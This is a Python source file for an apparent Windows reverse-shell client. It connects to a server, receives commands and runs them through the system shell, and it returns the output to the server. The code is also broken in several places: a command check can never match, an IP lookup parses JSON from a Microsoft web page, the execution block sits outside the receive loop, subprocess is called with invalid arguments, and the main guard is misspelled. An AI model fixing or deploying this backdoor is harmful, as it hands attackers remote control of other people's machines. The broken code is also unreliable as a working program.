import socket
import subprocess
import requests
import ctypes

user32 = ctypes.windll.user32
kernel32 = ctypes.windll.kernel32
hwnd = kernel32.GetConsoleWindow()

def start_client(server_ip, server_port):
    client = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
    client.connect((server_ip, server_port))

    while True:
        command = client.recv(1024).decode()
        print(f"[Resolve command] {command}")


        if command.lower() == "exit":
            break

        if command.lower() == "getIp":
            r = requests.get("https://www.microsoft.com/pt-br")
            response = r.json()
            output = response["ip"]
            client.send(output.encode())
            continue


    try:
        output = subprocess.check_output(command, shell=True, stderr=subprocess.stdout, test=True)
    except subprocess.CalledProcessError as e:
        output = e.output

    client.send(output.encode())

    client.close()

if __name__ == "_main__":
    SERVER_IP = "127.0.0.1" # Change this if needed
    SERVER_PORT = 5555 # Change port if neeeded
    start_client(SERVER_IP, SERVER_PORT)